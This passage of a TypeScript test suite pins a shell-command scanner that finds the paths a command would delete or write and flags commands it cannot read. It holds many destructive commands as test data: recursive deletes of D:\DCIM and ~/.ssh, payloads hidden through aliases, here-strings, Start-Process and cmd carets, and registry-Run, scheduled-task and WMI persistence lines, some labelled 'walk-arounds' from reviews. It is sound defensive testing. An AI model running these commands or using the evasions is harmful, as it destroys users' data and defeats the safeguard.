    expect(pathsOf(scan('Remove-Item %SystemDrive%\\x'), 'delete')).toEqual(['C:\\x'])
    expect(pathsOf(scan('Remove-Item $env:PUBLIC\\x'), 'delete')).toEqual(['C:\\Users\\Public\\x'])
    expect(pathsOf(scan('Remove-Item $env:ALLUSERSPROFILE\\x'), 'delete')).toEqual(['C:\\ProgramData\\x'])
    expect(pathsOf(scan('rm -rf $OneDrive/x', X, XBASE), 'delete')).toEqual([])
  })
  it('a recursive delete through an unset name and a separator is the root of the drive; a bound one is not', () => {
    expect(ofOp(scan('Remove-Item -Recurse "$env:NOPE\\*"'), 'delete').map(p => [p.path, p.children])).toEqual([['C:\\', true]])
    expect(pathsOf(scan('rm -rf "$NOPE"/*', X, XBASE), 'delete')).toEqual(['/'])
    expect(pathsOf(scan('Remove-Item "$env:NOPE\\x"'), 'delete')).toEqual([])            // not recursive
    // `Get-Location` bound to a name is the current folder (review 2026-11-23, fourth).
    expect(pathsOf(scan('$d = Get-Location; Remove-Item -Recurse "$d\\x"'), 'delete')).toEqual(['C:\\Users\\u\\proj\\x'])
    expect(pathsOf(scan('foreach ($d in $list) { Remove-Item -Recurse "$d\\x" }'), 'delete')).toEqual([])
    expect(pathsOf(scan('Remove-Item -Recurse $nope'), 'delete')).toEqual([])
  })
  it('code calls: aliases, bare imports, shell calls and their argv', () => {
    const py = (c: string) => scan(`python -c "${c}"`)
    expect(pathsOf(py("from shutil import rmtree as rt; rt('D:/a')"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(py("import shutil as sh; sh.rmtree('D:/a')"), 'delete')).toEqual(['D:\\a'])
    expect(ofOp(py("from os import unlink; unlink('D:/a')"), 'delete').map(p => p.verb)).toContain('os.unlink')
    expect(pathsOf(py("from subprocess import run; run(['cmd', '/c', 'rd', '/s', '/q', 'D:/a'])"), 'delete')).toEqual(['D:\\a'])
    expect(py('import os; os.system(c)').selfBuilding).toMatch(/cannot be read/)
    expect(py("import subprocess, sys; subprocess.run([sys.executable, '-m', 'pytest'])").selfBuilding).toBeNull()
    const js = (c: string) => scan(`node -e "${c}"`)
    expect(pathsOf(js("const f = require('fs'); f.rmSync('D:/a', {recursive: true})"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(js("const { execSync: x } = require('child_process'); x('rd /s /q D:/a')"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(js("require('child_process').spawnSync('cmd', ['/c', 'del', 'D:/a'])"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan("bun -e \"Bun.spawn({ cmd: ['cmd', '/c', 'del', 'D:/a'] })\""), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan("(Get-Item C:\\Users\\u\\proj\\a).CopyTo('D:\\b')"), 'write')).toEqual(['D:\\b'])
  })
  it('indirect invocation is self-building; a call operator on a literal program is not', () => {
    expect(scan('&(gcm Remove-It*) D:\\x').selfBuilding).not.toBeNull()
    expect(scan('. $(Join-Path $x y.ps1)').selfBuilding).not.toBeNull()
    expect(scan("$ExecutionContext.InvokeCommand.InvokeScript('x')").selfBuilding).not.toBeNull()
    expect(scan("Start-Job { param($p) Remove-Item $p } -ArgumentList 'D:\\x'").selfBuilding).not.toBeNull()
    expect(scan('& "C:\\Py\\python.exe" -m pytest').selfBuilding).toBeNull()
    expect(scan('git status && (cd sub; git status)', X, XBASE).selfBuilding).toBeNull()
    expect(scan('cmd /c "dir & (echo x)"').selfBuilding).toBeNull()
  })
})

describe('the second review of 2026-11-23: what the scan reads', () => {
  it('a PowerShell string that ends in a backslash is closed at its quote, and the POSIX reading is kept beside it', () => {
    const s = scan('Write-Host "cleaning C:\\"; Remove-Item -Recurse -Force C:\\Users\\u\\.cynco')
    expect(lower(pathsOf(s, 'delete'))).toContain('c:\\users\\u\\.cynco')
    // In a bash payload a backslash still escapes the quote.
    expect(scan('bash -c "echo \\"x\\"; rm -rf ~/.cache"').paths.some(p => p.op === 'delete')).toBe(true)
  })
  it('$HOME is the real home whatever $env:HOME, $HOME = or HOME= set; $env:HOME reads its assignment', () => {
    for (const c of ['$env:HOME = "C:\\x"; Remove-Item -Recurse "$HOME\\.cache"', '$HOME = "C:\\x"; Remove-Item -Recurse "$HOME\\.cache"']) {
      expect(lower(pathsOf(scan(c), 'delete'))).toEqual(['c:\\users\\u\\.cache'])
    }
    expect(lower(pathsOf(scan('$env:HOME = "C:\\x"; Remove-Item -Recurse "$env:HOME\\.cache"'), 'delete'))).toEqual(['c:\\x\\.cache'])
  })
  it('a multi-letter $env: assignment is not read as the variable $env plus text', () => {
    expect(scan("$env:GITX='D:\\DCIM'; echo hi").paths.some(p => p.op === 'mention' && p.path === 'D:\\DCIM')).toBe(true)
  })
  it('the pipeline item after text is a child of that text and an unresolved mutation; first, it inherits', () => {
    const s = scan("'.cache' | % { Remove-Item \"$HOME\\$_\" -Recurse }")
    expect(lower(pathsOf(s, 'delete'))).toContain('c:\\users\\u')
    expect(s.unresolvedMutation?.op).toBe('delete')
    expect(lower(pathsOf(scan('Get-ChildItem build | % { Remove-Item -Recurse "$_\\obj" }'), 'delete'))).toEqual(['c:\\users\\u\\proj\\build'])
  })
  it('a group followed by a member is one unreadable operand, not a path inside the mission folder', () => {
    const s = scan('Remove-Item (Get-Item D:\\Video).Parent -Recurse')
    expect(pathsOf(s, 'delete')).toEqual([])
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
    // The path members of a literal listing are the items inside the folder listed (review 2026-11-23, fourth).
    const items = ofOp(scan('Remove-Item (Get-ChildItem D:\\ -Directory).FullName -Recurse'), 'delete')
    expect(items.map(p => [p.path, p.children])).toEqual([['D:\\', true]])
  })
  it('code calls are read in the order of the text: a chdir holds for the calls after it', () => {
    expect(pathsOf(scan(`python -c "import os, shutil; os.chdir('D:/'); shutil.rmtree('Video')"`), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan(`python -c "import os, shutil; shutil.rmtree('Video'); os.chdir('D:/')"`), 'delete')).toEqual(['C:\\Users\\u\\proj\\Video'])
  })
  it('the shell reading of an inline program keeps only the verb table: a division, `as f:` and an arrow are not paths', () => {
    for (const c of [`python -c "print(10 / 3)"`, `python -c "with open('a.txt') as f: print(f.read())"`, `node -e "[1].filter(l=>/x/.test(l))"`]) {
      expect(scan(c).paths.filter(p => !p.startedIn && p.op !== 'read' && p.op !== 'mention')).toEqual([])
    }
  })
  it('a PowerShell expression statement names no program operand', () => {
    for (const c of ['$t[($n-30)..($n-1)]', '$_ -match "\\[ERROR\\]"', "$p -replace '\\\\', '/'"]) {
      expect(scan(c).paths.filter(p => p.op === 'unclassified')).toEqual([])
    }
  })
  it('Start-Process -ArgumentList as a comma list is the argv: a quoted -c carries the program', () => {
    expect(pathsOf(scan("Start-Process -FilePath python -ArgumentList '-c','import shutil; shutil.rmtree(''D:/DCIM'')'"), 'delete')).toEqual(['D:\\DCIM'])
  })
  it('a patch that makes a symbolic link names a link, with the line it points to', () => {
    // Pinned in toolPaths.test.ts through namePaths; here the shell scan is not involved.
    expect(scan('git apply --unsafe-paths x.patch').selfBuilding).toMatch(/unsafe-paths/)
  })
})

describe('the second review of 2026-11-23: cost', () => {
  // Generous bounds: the scan runs on the engine's event loop (F225), and each of these was seconds to
  // minutes before; under a loaded suite the time can grow, the shape cannot.
  const gens: Record<string, (n: number) => string> = {
    'a repeated require alias': n => `node -e "${"const f=require('fs');".repeat(n / 22)} f.rmSync('x')"`,
    'a repeated import alias': n => `python -c "${'from os import remove as r\n'.repeat(n / 27)}r('x')"`,
    'a long import list': n => `python -c "from os import ${'a,'.repeat(n / 2)}b"`,
    'many assignments': n => Array.from({ length: n / 12 }, (_, i) => `$v${i} = 'a'; `).join('') + 'Remove-Item $v1',
    'a long param list': n => `& { param(${'$a,'.repeat(n / 3)}$a) Remove-Item $a }`,
    'repeated code assignments': n => `python -c "${"x='a';".repeat(n / 6)}"`,
    'a long pipeline': n => `Get-ChildItem ${'| % { $_ } '.repeat(n / 11)}`,
    'a chain of mutating elements': n => `Get-ChildItem build ${'| Remove-Item -Recurse '.repeat(n / 23)}`,
    'nested cmd for loops': n => 'cmd /c "for /d %d in (x\\*) do '.repeat(n / 32) + 'rd /s /q %d',
  }
  const timeOf = (text: string): number => {
    const t0 = performance.now()
    scanShellText(text, BASE, W, { platform: 'win32' })
    return performance.now() - t0
  }
  for (const [name, g] of Object.entries(gens)) {
    it(`${name}: 100 KB is read in well under the budget, and four times the text costs at most about four times as much`, () => {
      const big = g(100 * 1024)
      expect(big.length).toBeLessThan(128 * 1024)
      expect(timeOf(big)).toBeLessThan(3000)
      const small = timeOf(g(16 * 1024)) + timeOf(g(16 * 1024))
      const large = timeOf(g(64 * 1024)) + timeOf(g(64 * 1024))
      // Linear would be 4; quadratic 16. The floor keeps a fast small case from making the ratio noise.
      expect(large / Math.max(small, 20)).toBeLessThan(9)
    })
  }
  it('a scan that runs past its budget stops and names the fault', () => {
    let t = 0
    const real = performance.now.bind(performance)
    performance.now = () => (t += 100)
    try {
      const s = scanShellText('Remove-Item a; '.repeat(200), BASE, W, { platform: 'win32' })
      expect(s.faults.some(f => /took longer than \d+ ms to read/.test(f))).toBe(true)
    } finally {
      performance.now = real
    }
  })
  it('a text longer than 128 KiB once its here-strings are set aside is a fault; the here-string body is not counted', () => {
    expect(scan(`python -c "${'print(1)\n'.repeat(15000)}"`).faults.some(f => /longer than 128 KiB/.test(f))).toBe(true)
    expect(scan(`@'\n${'x = 1\n'.repeat(40000)}'@ | Set-Content big.py`).faults).toEqual([])
  })
})

// The third review of 2026-11-23: what the scan itself reads now. The verdicts are in protectedPaths.test.ts
// (THIRD_ATTACKS, THIRD_PASSES); these pin the readings they rest on.
describe('the third review of 2026-11-23', () => {
  it('an element that changes the items hands a later mutation nothing it can read', () => {
    for (const cmd of [
      'Split-Path $PWD | Remove-Item -Recurse -Force',
      'Get-ChildItem (Split-Path $PWD) -Force | Remove-Item -Recurse -Force',
      'Get-Item . | Select-Object -ExpandProperty Parent | Get-ChildItem -Force | Remove-Item -Recurse -Force',
      'Get-Item . | ForEach-Object Parent | Remove-Item -Recurse -Force',
      'Get-Item . | % { $_.Root } | Get-ChildItem | Remove-Item -Recurse -Force',
      '(Get-Item .).Parent.GetDirectories() | Remove-Item -Recurse -Force',
      'Get-ChildItem (Get-Item $PWD).Parent -Force | Remove-Item -Recurse -Force',
      "Get-Item . | Select-Object @{n='LiteralPath';e={'D:\\DCIM'}} | Remove-Item -Recurse -Force",
    ]) {
      const s = scan(cmd)
      expect(s.unresolvedMutation, cmd).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
      expect(pathsOf(s, 'delete'), cmd).toEqual([])
      expect(s.parentClimb, cmd).toBeGreaterThan(cmd.includes('LiteralPath') ? -1 : 0)
    }
  })
  it('filters and item sources pass the items on', () => {
    const s = scan('Get-ChildItem build | Where-Object { $_.Length -gt 0 } | Sort-Object Name | Select-Object -First 3 | Remove-Item -Recurse')
    expect(pathsOf(s, 'delete')).toEqual(['C:\\Users\\u\\proj\\build'])
    expect(s.unresolvedMutation).toBeNull()
    expect(pathsOf(scan('Get-ChildItem D:\\x | Select-Object -ExpandProperty FullName | Remove-Item'), 'delete')).toEqual(['D:\\x'])
  })
  it('a here-string used as a value is the text it holds', () => {
    for (const cmd of ["Remove-Item @'\nD:\\DCIM\n'@ -Recurse", "$p = @'\nD:\\DCIM\n'@; Remove-Item $p -Recurse", "Remove-Item -Recurse (@'\nD:\\DCIM\n'@)",
      "Remove-Item -Recurse $(@'\nD:\\DCIM\n'@)"]) {
      expect(pathsOf(scan(cmd), 'delete'), cmd).toEqual(['D:\\DCIM'])
    }
    // At the head of a pipeline it is an item; fed to a writer or an interpreter it is text.
    const head = scan("@'\nD:\\DCIM\nD:\\Video\n'@ | Remove-Item -Recurse")
    expect(pathsOf(head, 'delete')).toEqual(['D:\\DCIM', 'D:\\Video'])
    expect(ofOp(scan("@'\nD:\\DCIM\n'@ | Set-Content list.txt"), 'mention')).toEqual([])
    // A double-quoted one has its variables read.
    expect(lower(pathsOf(scan('$p = @"\n$env:USERPROFILE\\.ssh\n"@; Remove-Item $p -Recurse'), 'delete'))).toEqual(['c:\\users\\u\\.ssh'])
  })
  it('a list bound to a variable is judged on every element, whatever the index', () => {
    expect(pathsOf(scan("$a = 'x','D:\\DCIM'; Remove-Item $a[1] -Recurse"), 'delete')).toEqual(['C:\\Users\\u\\proj\\x', 'D:\\DCIM'])
    expect(pathsOf(scan("$a = 'x','D:\\DCIM'; Remove-Item $a -Recurse"), 'delete')).toEqual(['C:\\Users\\u\\proj\\x', 'D:\\DCIM'])
    expect(pathsOf(scan("$a = 'D:\\DCIM','x'; $a | Remove-Item -Recurse"), 'delete')).toEqual(['D:\\DCIM', 'C:\\Users\\u\\proj\\x'])
  })
  it("cmd's /c glued to its command, and a caret inside a word, are read as cmd reads them", () => {
    for (const cmd of ['cmd /c"rd /s /q D:\\DCIM"', 'cmd.exe /k"rd /s /q D:\\DCIM"', 'cmd /crd /s /q D:\\DCIM', 'cmd /c "rd /s /q D^:\\DCIM"',
      'cmd /c "rd /s /q ^D:\\DCIM"', 'cmd /c rd /s /q D^:\\DCIM']) {
      expect(pathsOf(scan(cmd), 'delete'), cmd).toEqual(['D:\\DCIM'])
    }
    // A caret before one of cmd's operators keeps that character as text.
    expect(pathsOf(scan('cmd /c "echo a^> D:\\x"'), 'write')).toEqual([])
  })
  it('Start-Process is bound as PowerShell binds it: program, argument list, working folder', () => {
    for (const cmd of [
      "Start-Process -FilePath cmd -ArgumentList '/c','rd','/s','/q','D:\\DCIM'", "saps cmd '/c','rd /s /q D:\\DCIM'",
      "Start-Process -Wait -FilePath cmd -ArgumentList '/c','rd /s /q D:\\DCIM'", 'Start-Process cmd -ArgumentList "/c rd /s /q D:\\DCIM" -Wait',
      "Start-Process cmd -WorkingDirectory D:\\ -ArgumentList '/c','rd /s /q DCIM'", "Start-Process -NoNewWindow cmd -Args '/c','rd /s /q D:\\DCIM'",
    ]) {
      expect(pathsOf(scan(cmd), 'delete'), cmd).toEqual(['D:\\DCIM'])
    }
    expect(lower(pathsOf(scan("Start-Process powershell -ArgumentList '-c','Remove-Item ~\\.cache -Recurse'"), 'delete'))).toEqual(['c:\\users\\u\\.cache'])
    expect(pathsOf(scan("Start-Process cmd -ArgumentList '/c','dir' -RedirectStandardOutput D:\\out.txt"), 'write')).toEqual(['D:\\out.txt'])
    const honest = scan("Start-Process -FilePath python -ArgumentList '-c','print(1)' -Wait")
    expect(honest.paths.filter(p => p.op !== 'mention' && !p.startedIn)).toEqual([])
  })
  it("git's -c core.worktree is the work tree, as --work-tree is; GIT_CONFIG_* in the environment is not read", () => {
    expect(pathsOf(scan('git -c core.worktree=D:/DCIM clean -fdx'), 'write')).toContain('D:\\DCIM')
    expect(pathsOf(scanArgv(['git', '-c', 'core.worktree=D:/DCIM', 'reset', '--hard'], BASE, W, { platform: 'win32' }), 'write')).toContain('D:\\DCIM')
    expect(scan('$env:GIT_CONFIG_PARAMETERS="\'core.worktree=D:/x\'"; git clean -fdx').selfBuilding).toContain('GIT_CONFIG_')
    expect(scan('git -c core.worktree=. status').selfBuilding).toBeNull()
  })
  it('a home name assigned where it may not run stays the real home', () => {
    for (const cmd of ['if ($false) { $env:USERPROFILE = "$PWD\\h" }; Remove-Item -Recurse "$env:USERPROFILE\\.cache"',
      '$false -and ($env:USERPROFILE = "$PWD\\h"); Remove-Item -Recurse "$env:USERPROFILE\\.cache"']) {
      expect(lower(pathsOf(scan(cmd), 'delete')), cmd).toEqual(['c:\\users\\u\\.cache'])
    }
    // At the top level the assignment holds, as before.
    expect(lower(pathsOf(scan('$env:USERPROFILE = "$PWD\\h"; Remove-Item -Recurse "$env:USERPROFILE\\.cache"'), 'delete'))).toEqual(['c:\\users\\u\\proj\\h\\.cache'])
  })
  it('an empty subexpression or default is a name nothing set: the root of the current drive', () => {
    for (const cmd of ['Remove-Item -Recurse "$()\\*"', 'Remove-Item -Recurse "$($null)\\*"', 'rm -rf "$(echo)"/*', 'rm -rf "${UNSET:-}"/*']) {
      const d = ofOp(scan(cmd), 'delete')
      expect(d.map(p => p.path), cmd).toEqual(['C:\\'])
    }
    expect(pathsOf(scan('rm -rf "${OUT:-build}"/x'), 'delete')).toContain('C:\\Users\\u\\proj\\build\\x')
  })
  it('the format operator over literals is the text it makes', () => {
    expect(pathsOf(scan("Remove-Item -Recurse -Force ('{0}:\\DCIM' -f 'D')"), 'delete')).toEqual(['D:\\DCIM'])
    expect(pathsOf(scan("Remove-Item -Recurse ('{0}\\{1}' -f 'D:','x')"), 'delete')).toEqual(['D:\\x'])
  })
  it('a code literal is a program operand only when it can only be a path', () => {
    for (const lit of ["'/'", "'x:'", "'/a/b'", "r'\\[ask\\]'", "'\\n\\n'", "'/** a'"]) {
      expect(ofOp(scan(`python -c "print(${lit})"`), 'unclassified'), lit).toEqual([])
    }
    expect(pathsOf(scan(`python -c "print(open(r'D:\\Video\\a.txt'))"`), 'read', 'unclassified')).toEqual(['D:\\Video\\a.txt'])
    expect(pathsOf(scan(`python -c "x('D:\\\\')"`), 'unclassified')).toEqual(['D:\\'])
    expect(pathsOf(scan(`python3 -c "print('/home/u/.ssh')"`, X, XBASE), 'unclassified')).toEqual(['/home/u/.ssh'])
  })
  it('here-documents: two on one line, and an opener inside a body, are read as a shell reads them', () => {
    const s = scan('cat <<A <<B\na1\nA\nb1\nB\necho done')
    expect(s.texts).toContain('a1')
    expect(s.texts).toContain('b1')
    const t = scan("python - <<'EOF'\nprint('<<X')\nEOF\nrm -rf build")
    expect(pathsOf(t, 'delete')).toEqual(['C:\\Users\\u\\proj\\build'])
    // An unclosed opener is text, and a closed one after it is still a body.
    const u = scan("@'\nnever closed\n@\"\nbody\n\"@ | Set-Content a.txt")
    expect(u.texts).toContain('body')
  })
  it('a scan that ran past its budget is a fault however few steps asked', () => {
    let t = 0
    const real = performance.now.bind(performance)
    performance.now = () => (t += 1000)
    try {
      expect(scanShellText('Remove-Item build', BASE, W, { platform: 'win32' }).faults.some(f => /took longer than \d+ ms to read/.test(f))).toBe(true)
      expect(scanArgv(['git', 'status'], BASE, W, { platform: 'win32' }).faults.some(f => /took longer than \d+ ms to read/.test(f))).toBe(true)
    } finally {
      performance.now = real
    }
  })
})

// The fourth review of 2026-11-23: what the scan itself reads now. Each row is a walk-around of the review,
// read here as the shell runs it (the verdicts are in protectedPaths.test.ts, FOURTH_ATTACKS).
describe('the fourth review of 2026-11-23', () => {
  const lines = (n: number, last: string) => `@'\n${Array.from({ length: n }, (_, i) => `f${i}.txt`).join('\n')}\n${last}\n'@`
  // [command, op, path]: the path is read with that operation.
  const READS: Array<[string, string, string]> = [
    // an opener in a comment or at the end of a closed string is not a here-string
    ["Write-Output 'mail me @'\nRemove-Item -Recurse -Force D:\\DCIM\n'@'", 'delete', 'D:\\DCIM'],
    ["Write-Output 1 # @'\nRemove-Item -Recurse -Force D:\\DCIM\n'@'", 'delete', 'D:\\DCIM'],
    ["git log --author='bot@'\nRemove-Item -Recurse -Force C:\\Users\\u\\.cynco\n'@' | Out-Null", 'delete', 'C:\\Users\\u\\.cynco'],
    ['$a = 1 # <<A\nRemove-Item -Recurse -Force D:\\DCIM\nA', 'delete', 'D:\\DCIM'],
    ["bash -c 'echo x # <<EOF\nrm -rf /d/DCIM\nEOF'", 'delete', 'D:\\DCIM'],
    // cmd has no single quotes
    ['cmd /c "echo \' & rd /s /q D:\\DCIM & echo \'"', 'delete', 'D:\\DCIM'],
    ['cmd /c "echo it\'s & rd /s /q C:\\Users\\u\\.cynco & echo done\'s"', 'delete', 'C:\\Users\\u\\.cynco'],
    // Start-Process: a spaced comma list, the common parameters, a group, a variable, a cd in the payload
    ["Start-Process cmd '/c', 'rd /s /q D:\\DCIM'", 'delete', 'D:\\DCIM'],
    ["Start-Process powershell -ArgumentList '-NoProfile', '-Command', 'Remove-Item D:\\DCIM -Recurse -Force' -Wait", 'delete', 'D:\\DCIM'],
    ["Start-Process -ErrorAction SilentlyContinue cmd '/c rd /s /q D:\\DCIM'", 'delete', 'D:\\DCIM'],
    ["Start-Process -ev e cmd '/c rd /s /q C:\\Users\\u\\.cache'", 'delete', 'C:\\Users\\u\\.cache'],
    ["Start-Process cmd @('/c','rd /s /q D:\\DCIM')", 'delete', 'D:\\DCIM'],
    ["$a = '/c','rd','/s','/q','D:\\DCIM'; Start-Process cmd -ArgumentList $a", 'delete', 'D:\\DCIM'],
    ["$a = '/c rd /s /q C:\\Users\\u\\.ssh'; Start-Process cmd $a", 'delete', 'C:\\Users\\u\\.ssh'],
    ["Start-Process cmd -ArgumentList '/c pushd D:\\ && rd /s /q DCIM'", 'delete', 'D:\\DCIM'],
    ["Start-Process powershell '-c cd C:\\Users\\u; Remove-Item -Recurse -Force .ssh'", 'delete', 'C:\\Users\\u\\.ssh'],
    // a group handed to an interpreter as its payload
    ['cmd /c ("rd /s /q " + "D:\\DCIM")', 'delete', 'D:\\DCIM'],
    ['cmd /c $("rd /s /q D:\\DCIM")', 'delete', 'D:\\DCIM'],
    ['powershell -Command ("Remove-Item C:\\Users\\u\\.ssh -Recurse")', 'delete', 'C:\\Users\\u\\.ssh'],
    // a here-string value is read to its last line
    [`Remove-Item ${lines(99, 'D:\\DCIM')} -Recurse -Force`, 'delete', 'D:\\DCIM'],
    [`$l = ${lines(99, 'C:\\Users\\u\\.ssh')}\nRemove-Item $l -Recurse -Force`, 'delete', 'C:\\Users\\u\\.ssh'],
    // a list continued on the next line
    ["$a = 'x',\n'D:\\DCIM'; Remove-Item $a[1] -Recurse -Force", 'delete', 'D:\\DCIM'],
    // a drive-relative literal on a drive the run has no folder on
    ['python -c "import shutil as s; f = getattr(s, \'rmtree\'); f(\'D:DCIM\')"', 'unclassified', 'D:\\DCIM'],
    // -f with spaces, in an assignment, at the head of a pipeline; Join-Path over two words
    ["Remove-Item ('{0}:\\{1}' -f 'D', 'DCIM') -Recurse -Force", 'delete', 'D:\\DCIM'],
    ["$p = '{0}:\\{1}' -f 'D','DCIM'; Remove-Item $p -Recurse -Force", 'delete', 'D:\\DCIM'],
    ["'{0}:\\DCIM' -f 'D' | Remove-Item -Recurse", 'delete', 'D:\\DCIM'],
    ["Remove-Item (Join-Path $HOME '.cynco') -Recurse", 'delete', 'C:\\Users\\u\\.cynco'],
    ['$p = Join-Path $PWD out; Remove-Item $p -Recurse -Force', 'delete', 'C:\\Users\\u\\proj\\out'],
    // POSIX expansions and Deno's environment
    ["bash -c 'rm -rf \"${NOPE#x}/c/Users/u/.ssh\"'", 'delete', 'C:\\'],
    ["bash -c 'rm -rf \"${X-$HOME/.ssh}\"'", 'delete', 'C:\\Users\\u\\.ssh'],
    ["deno eval \"Deno.removeSync(Deno.env.get('USERPROFILE')+'/.ssh',{recursive:true})\"", 'mention', 'C:\\Users\\u'],
    // always-empty subexpressions
    ['Remove-Item "$([string]::Empty)\\Users\\u\\.ssh" -Recurse -Force', 'delete', 'C:\\'],
    ["Remove-Item \"$(''+'')\\Users\\u\\.ssh\" -Recurse -Force", 'delete', 'C:\\'],
    // the subexpressions of an expandable body run
    ['$x = @"\n$(Remove-Item -Recurse D:\\DCIM)\n"@', 'delete', 'D:\\DCIM'],
    ["bash -c 'cat <<EOF\n$(rm -rf /d/DCIM)\nEOF'", 'delete', 'D:\\DCIM'],
    // PowerShell's own whitespace and quotes
    [`Remove-Item${String.fromCharCode(0xa0)}-Recurse${String.fromCharCode(0xa0)}D:\\DCIM`, 'delete', 'D:\\DCIM'],
    ['Write-Output ok\rRemove-Item -Recurse -Force C:\\Users\\u\\.ssh', 'delete', 'C:\\Users\\u\\.ssh'],
    [`Remove-Item -Recurse ${String.fromCharCode(0x201c)}D:\\DCIM${String.fromCharCode(0x201d)}`, 'delete', 'D:\\DCIM'],
    // a native program's arguments as PowerShell builds them
    ["cmd /c pushd D:\\ '&&' rd /s /q DCIM", 'delete', 'D:\\DCIM'],
    ["cmd /c echo y '|' del /s D:\\DCIM\\*", 'delete', 'D:\\DCIM'],
    ['cmd /c pushd D:\\ --% && rd /s /q DCIM', 'delete', 'D:\\DCIM'],
    ["wsl cd /mnt/d ';' rm -rf /mnt/d/DCIM", 'delete', 'C:\\mnt\\d\\DCIM'],
    // $(Get-Location) and $(Resolve-Path ~) are the anchors
    ['Remove-Item -Recurse -Force "$(Get-Location)\\..\\.cynco"', 'delete', 'C:\\Users\\u\\.cynco'],
    ['Remove-Item -Recurse -Force "$(Resolve-Path ~)\\.ssh"', 'delete', 'C:\\Users\\u\\.ssh'],
    // a payload that is one string-literal subexpression
    ["cmd /c \"$('rd /s /q D:\\DCIM')\"", 'delete', 'D:\\DCIM'],
    // an option with its value glued on
    ['python clean.py --target=C:\\Users\\u\\.ssh', 'unclassified', 'C:\\Users\\u\\.ssh'],
    ['foo -oD:\\b', 'unclassified', 'D:\\b'],
    ['foo /out:C:\\Users\\u\\.gitconfig', 'unclassified', 'C:\\Users\\u\\.gitconfig'],
    ['tar -xf a.tar -CD:\\', 'write', 'D:\\'],
    // cmd /k with nothing after it reads standard input
    ["'rd /s /q C:\\Users\\u\\.ssh' | cmd /q /k", 'delete', 'C:\\Users\\u\\.ssh'],
    // a script written and run by the same command
    ["Set-Content run.cmd 'rd /s /q C:\\Users\\u\\.ssh'; cmd /c run.cmd", 'delete', 'C:\\Users\\u\\.ssh'],
    ['cmd /c "echo rd /s /q C:\\Users\\u\\.ssh>x.cmd&x"', 'delete', 'C:\\Users\\u\\.ssh'],
    // git: where it writes
    ['$env:GIT_INDEX_FILE = "$HOME\\.idx"; git add .', 'write', 'C:\\Users\\u\\.idx'],
    ['$env:GIT_OBJECT_DIRECTORY = "D:\\o"; git add .', 'write', 'D:\\o'],
    // the bindings that keep honest shapes read: a loop over a listing, a cmd for over a literal list
    ['foreach ($d in Get-ChildItem build) { Remove-Item -Recurse "$d\\obj" }', 'delete', 'C:\\Users\\u\\proj\\build'],
    ['cmd /c "for /d %d in (build\\*) do rd /s /q "%d""', 'delete', 'C:\\Users\\u\\proj\\build'],
    ["'build','dist' | % { Remove-Item \".\\$_\" -Recurse -Force }", 'delete', 'C:\\Users\\u\\proj\\dist'],
    ['Get-ChildItem -Recurse -Filter *.pyc | Remove-Item -Force', 'delete', 'C:\\Users\\u\\proj'],
  ]
  for (const [cmd, op, path] of READS) {
    it(`${op} ${path}: ${JSON.stringify(cmd).slice(0, 90)}`, () => {
      expect(lower(pathsOf(scan(cmd), op)), cmd).toContain(path.toLowerCase())
    })
  }
  // [command, op]: a mutation through a target the scan cannot read.
  const UNREAD: Array<[string, string]> = [
    ['Set-Location D:\\; Get-ChildItem C:\\Users\\u\\proj\\fake -Name | Remove-Item -Recurse -Force', 'delete'],
    ['Get-Item . | & { process { $_.Parent } } | Remove-Item -Recurse -Force', 'delete'],
    ['Get-Item . | . { process { $_.Parent } } | Remove-Item -Recurse -Force', 'delete'],
    ['Get-Item . | ForEach-Object { Remove-Item $_.Parent.FullName -Recurse -Force }', 'delete'],
    ['Get-Item . | Where-Object { Remove-Item $_.Parent -Recurse -Force }', 'delete'],
    ['Get-Item . | % PSParentPath | Remove-Item -Recurse -Force', 'delete'],
    ['git -c core.worktree=$(Split-Path $PWD) clean -fdx', 'write'],
    ['git -C $(Split-Path $PWD) clean -fdx', 'delete'],
    ["$env:WT='..'; git --config-env=core.worktree=WT clean -fdx", 'write'],
    ["('a;D:\\DCIM' -split ';')[1] | Remove-Item -Recurse", 'delete'],
    ["('C:\\Users\\u\\proj' -replace 'proj','.ssh') | Remove-Item -Recurse", 'delete'],
    ["Set-Variable -Name p -Value ('{0}:\\DCIM' -f 'D'); Remove-Item $p -Recurse", 'delete'],
    ['Start-Process -Foo x cmd', 'write'],
    ["Clear-Content ([char]68 + ':\\DCIM\\*')", 'delete'],
  ]
  for (const [cmd, op] of UNREAD) {
    it(`unread ${op}: ${JSON.stringify(cmd).slice(0, 90)}`, () => {
      expect(scan(cmd).unresolvedMutation?.op, cmd).toBe(op)
    })
  }
  const SELF: string[] = [
    'Set-Alias Get-Content Remove-Item; Get-Content D:\\DCIM -Recurse',
    'New-Item -Path alias:cat -Value Remove-Item -Force; cat D:\\DCIM -Recurse',
    'Set-Item alias:cat Remove-Item -Force; cat D:\\DCIM -Recurse',
    'Import-Alias x.csv; gci ~ -Force | d2 -Recurse',
    'function Sort-Object { process { $_.Parent } }; Get-Item . | Sort-Object | Remove-Item -Recurse -Force',
    "[Environment]::SetEnvironmentVariable('GIT_CONFIG_COUNT','1'); git clean -fdx",
    '$env:GIT_EXEC_PATH = "$PWD"; git status',
    'git clone --config core.fsmonitor=x.cmd https://example.invalid/r r',
    "Start-Process cmd @('/c', $x)",
    "python -c (Get-Content .\\p.txt -Raw)",
    'bash -c "$(cat c.sh)"',
    "Register-ScheduledTask -TaskName x -Action (New-ScheduledTaskAction -Execute cmd -Argument '/c rd /s /q D:\\DCIM')",
    "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd /c rd /s /q D:\\DCIM'",
    "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run x 'cmd /c rd /s /q D:\\DCIM'",
    'schtasks /run /tn x',
  ]
  for (const cmd of SELF) {
    it(`self-building: ${JSON.stringify(cmd).slice(0, 90)}`, () => {
      expect(scan(cmd).selfBuilding, cmd).not.toBeNull()
    })
  }
  it('the facts the policy judges: a temp name reassigned, a folder that cannot be read, an unread operand', () => {
    const t = scan("$env:TEMP = 'D:\\DCIM'; Remove-Item -Recurse -Force ([IO.Path]::GetTempPath())")
    expect(t.tempRedirected).toMatch(/TEMP/)
